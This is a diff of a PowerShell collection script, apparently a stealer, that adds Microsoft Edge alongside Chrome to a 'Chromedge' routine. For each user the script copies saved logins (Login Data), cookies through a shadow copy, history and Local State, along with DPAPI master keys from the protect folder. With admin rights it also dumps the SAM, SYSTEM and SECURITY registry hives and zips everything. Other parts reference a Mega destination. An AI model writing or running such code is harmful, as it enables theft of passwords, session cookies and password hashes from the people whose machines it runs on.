@@ -1,7 +1,7 @@
 ﻿function Invoke-StreamCopy {
 param (
     [switch]$First,
-    [switch]$Chrome,
+    [switch]$Chromedge,
     [switch]$Stream,
     [switch]$DownAll,
     [string]$objName,
@@ -60,22 +60,32 @@ function Secure-Copy ($param) {
         }
     }
 
-function Chrome-Copy ($usersDir) {
+function Chromedge-Copy ($usersDir) {
     
     #$user = (((Split-Path $usersDir.fullName -Leaf) -Replace '\.[^\.]*$') + '\')
     $chromeUserDestDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDestDir -ItemType Directory -ea 0
-    $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\user data\')
+    $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\User Data\')
+    $edgeUserDestDir = ($edgeDestDir + $usersDir.Name + '\'); New-Item $edgeUserDestDir -ItemType Directory -ea 0
+    $edgeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Microsoft\Edge\User Data\')
+
     Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDestDir)
-    Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($chromeUserDestDir)
-    attrib.exe -h -s ($chromeUserDestDir + '\*') /s #; attrib +h +s ($chromeUserDir + '\CREDHIST'); attrib +h +s ($chromeUserDir + '\SYNCHIST')
+    Copy-Item -Force ($edgeUserDataDir + '\Local State') -Destination ($edgeUserDestDir)
 
     foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
         $chromeProfileDestDir = ($chromeUserDestDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDestDir -ItemType Directory -ea 0
         Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDestDir
         Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDestDir
-        $cPath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
-        echo $cPath
-        cmd /c copy $cPath $chromeProfileDestDir
+        $cookChromePath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
+        cmd /c copy $cookChromePath $chromeProfileDestDir
+    }
+
+    foreach ($profile in (gci -Path $edgeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
+        $edgeProfileDestDir = ($edgeUserDestDir + $profile.Directory.Name + '\'); New-Item $edgeProfileDestDir -ItemType Directory -ea 0
+        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $edgeProfileDestDir
+        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $edgeProfileDestDir
+        $cookEdgePath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
+        echo $cookEdgePath
+        cmd /c copy $cookEdgePath $edgeProfileDestDir
     }
 }
 
@@ -104,8 +114,9 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($destMega -eq "") { $destMega = "ZSUDocs" }
 
-    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chrome -ne $true) -and ($DownAll -ne $true)) {
-        echo "You must specify at least one of <First> or <Stream> or <DownAll>"
+    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chromedge -ne $true) -and ($DownAll -ne $true)) {
+        echo "You must specify at least one of <First> or <Stream> or <DownAll> or <Chromedge>"
+        return
     }
 
     if ($Stream -OR $First) { 
@@ -114,17 +125,18 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
         echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
     }
 
-    if ($Chrome) {
-        $chromeDestDir = ($destDir + 'Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0
+    if ($Chromedge) {
+        $browsersDestDir = ($destDir + 'Browsers\'); New-Item $browsersDestDir -ItemType Directory -ea 0
+        $chromeDestDir = ($destDir + 'Browsers\Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0
+        $edgeDestDir = ($destDir + 'Browsers\Edge\'); New-Item $edgeDestDir -ItemType Directory -ea 0
         if (Test-isAdmin) {
-            reg.exe save hklm\sam $chromeDestDir\SAM
-            reg.exe save hklm\system $chromeDestDir\SYSTEM
-            reg.exe save hklm\security $chromeDestDir\SECURITY
+            reg.exe save hklm\sam $browsersDestDir\SAM
+            reg.exe save hklm\system $browsersDestDir\SYSTEM
+            reg.exe save hklm\security $browsersDestDir\SECURITY
         }
 
         $VSsvc = (Get-Service -name VSS)
-        if($VSsvc.Status -ne "Running")
-        {
+        if($VSsvc.Status -ne "Running") {
             $notrunning=1
             $VSsvc.Start()
         }
@@ -134,13 +146,15 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
         foreach ($usersDir in (gci $srcdir)) {
             if ($usersDir.Name -eq "Public") { continue }
-            Chrome-Copy ($usersDir)
+            Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($browsersDestDir)
+            attrib.exe -h -s ($browsersDestDir + '\*') /s
+            Chromedge-Copy ($usersDir)
         }
 
         $volume.Delete()
         if($notrunning -eq 1) { $VSsvc.Stop() }
 
-        Compress-Archive $chromeDestDir -Destination "$destDir\Chrome_$currDateTime.zip"
+        Compress-Archive $browsersDestDir -Destination "$destDir\Chromedge_$currDateTime.zip"
 
     }
 
